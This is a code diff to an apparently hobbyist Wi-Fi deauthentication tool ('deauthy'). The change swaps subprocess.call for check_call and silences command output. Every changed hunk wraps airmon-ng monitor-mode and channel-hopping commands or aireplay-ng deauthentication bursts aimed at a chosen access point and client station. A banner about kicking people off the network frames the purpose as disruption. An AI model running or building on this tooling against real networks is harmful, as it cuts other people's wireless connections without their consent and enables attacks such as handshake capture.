@@ -1,6 +1,6 @@
 from os import system
 from colorama import init, Fore, Back, Style
-from subprocess import call
+from subprocess import DEVNULL, STDOUT, check_call
 
 # Beautiful is better than ugly.
 # Explicit is better than implicit.
@@ -72,7 +72,7 @@ Time to kick off some assholes from yer net""")
             channel = Config.BSSIDs[bSSID]
             deauthy.ChannelSys.hopper(channel)
             try:
-                out = call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon])
+                out = check_call(["aireplay-ng", "-0", "5", "-a", bSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
             except KeyboardInterrupt:
                 deauthy.InterfaceMode.switch("managed")
                 return
@@ -82,7 +82,7 @@ Time to kick off some assholes from yer net""")
             channel = Config.ESSID[eSSID]
             deauthy.ChannelSys.hopper(channel)
             try:
-                out = call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon])
+                out = check_call(["aireplay-ng", "-0", "5", "-e", eSSID, "-c", Config.STATION, Config.iface_mon], stdout=DEVNULL, stderr=STDOUT)
             except KeyboardInterrupt:
                 deauthy.InterfaceMode.switch("managed")
                 return
@@ -90,7 +90,7 @@ Time to kick off some assholes from yer net""")
     class ChannelSys:
         def hopper(channel_number: int):
             """Hop to a different channel"""
-            out = call(["airmon-ng", "start", f"{Config.iface_no_mon}mon", f"{channel_number}"])
+            out = check_call(["airmon-ng", "start", f"{Config.iface_no_mon}mon", f"{channel_number}"], stdout=DEVNULL, stderr=STDOUT)
 
     class InterfaceMode:
         def switch(mode: str):
@@ -98,9 +98,9 @@ Time to kick off some assholes from yer net""")
             Accepts either "monitor" or "managed"
             """
             def managed():
-                out = call(["airmon-ng", "stop", f"{Config.iface_no_mon}mon"])
+                out = check_call(["airmon-ng", "stop", f"{Config.iface_no_mon}mon"], stdout=DEVNULL, stderr=STDOUT)
             def monitor():
-                out = call(["airmon-ng", "start", f"{Config.iface_no_mon}"])
+                out = check_call(["airmon-ng", "start", f"{Config.iface_no_mon}"], stdout=DEVNULL, stderr=STDOUT)
             modes = {
                 "managed":managed,
                 "monitor":monitor,
